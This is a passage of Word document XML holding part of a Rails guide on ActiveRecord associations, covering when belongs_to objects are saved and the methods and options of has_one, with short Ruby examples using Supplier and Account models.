      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5544"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="1F468394" w14:textId="77777777" w:rsidTr="006A66A5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="70198B0C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>if</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@order.customer.nil?</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1EF845A5" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  @msg</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= "No customer found for this order"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="35948F34" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6F327564" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>4.1.4 When are Objects Saved?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DCE791B" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Assigning an object to a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>belongs_to</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association does </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>not</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> automatically save the object. It does not save the associated object either.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="750903B5" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_one</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Association Reference</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75E01D2E" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_one</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association creates a one-to-one match with another model. In database terms, this association says that the other class contains the foreign key. If this class contains the foreign key, then you should use </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>belongs_to</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> instead.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31CC533D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.2.1 Methods Added by </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_one</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06A229CC" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">When you declare a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_one</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association, the declaring class automatically gains four methods related to the association:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="162A3A66" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="47"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>association</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>(force_reload = false)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D0F12E0" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="47"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>association</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>=(associate)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76540193" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="47"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>build_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>association</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>(attributes = {})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FCD5B51" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="47"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>create_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>association</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>(attributes = {})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5434F017" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In all of these methods, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>association</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is replaced with the symbol passed as the first argument to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_one</w:t>
      </w:r>
      <w:r>
        <w:t>. For example, given the declaration:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4344"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="05D65B7A" w14:textId="77777777" w:rsidTr="006A66A5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0DEB8F01" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Supplier &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="20D9DB61" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_one :account</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="60C1CCB0" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0B7FFB24" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Each instance of the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Supplier</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> model will have these methods:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1896"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="11FF246C" w14:textId="77777777" w:rsidTr="006A66A5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="47D240CF" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>account</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="680D2FE5" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>account=</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5CF35734" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>build_account</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7E655F1F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>create_account</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0424F5F7" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">When initializing a new </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_one</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>belongs_to</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association you must use the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>build_</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> prefix to build the association, rather than the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>association.build</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method that would be used for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_many</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_and_belongs_to_many</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> associations. To create one, use the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>create_</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> prefix.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18FCB716" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.2.1.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>association</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>(force_reload = false)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32087CDE" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>association</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method returns the associated object, if any. If no associated object is found, it returns </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3504"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="613C8998" w14:textId="77777777" w:rsidTr="006A66A5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0AAB1B21" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82">
            <w:pPr>
              <w:divId w:val="86847627"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@account</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= @supplier.account</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6A77666E" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If the associated object has already been retrieved from the database for this object, the cached version will be returned. To override this behavior (and force a database read), pass </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> as the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>force_reload</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> argument.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01A17E7B" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.2.1.2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>association</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>=(associate)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B7DD31B" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>association</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>=</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method assigns an associated object to this object. Behind the scenes, this means extracting the primary key from this object and setting the associate object’s foreign key to the same value.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3576"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="6862EA4A" w14:textId="77777777" w:rsidTr="006A66A5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="151882E9" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82">
            <w:pPr>
              <w:divId w:val="133523000"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@supplier.account = @account</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="35C2FF93" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.2.1.3 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>build_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>association</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>(attributes = {})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14D36EBD" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>build_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>association</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method returns a new object of the associated type. This object will be instantiated from the passed attributes, and the link through its foreign key will be set, but the associated object will </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>not</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> yet be saved.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6551"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="17DA70F0" w14:textId="77777777" w:rsidTr="006A66A5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0E4C1551" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82">
            <w:pPr>
              <w:divId w:val="1477451174"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@account</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= @supplier.build_account(:terms</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "Net 30")</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="322B569E" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.2.1.4 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>create_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>association</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>(attributes = {})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43A6C46A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>create_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>association</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method returns a new object of the associated type. This object will be instantiated from the passed attributes, the link through its foreign key will be set, and, once it passes all of the validations specified on the associated model, the associated object </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>will</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> be saved.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6671"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="2FDFE5F9" w14:textId="77777777" w:rsidTr="006A66A5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6FC9E841" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82">
            <w:pPr>
              <w:divId w:val="1456944412"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@account</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= @supplier.create_account(:terms</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "Net 30")</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3B864BB6" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.2.2 Options for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_one</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A135F2F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">While Rails uses intelligent defaults that will work well in most situations, there may be times when you want to customize the behavior of the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_one</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association reference. Such customizations can easily be accomplished by passing options when you create the association. For example, this assocation uses two such options:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8471"/>
      </w:tblGrid>
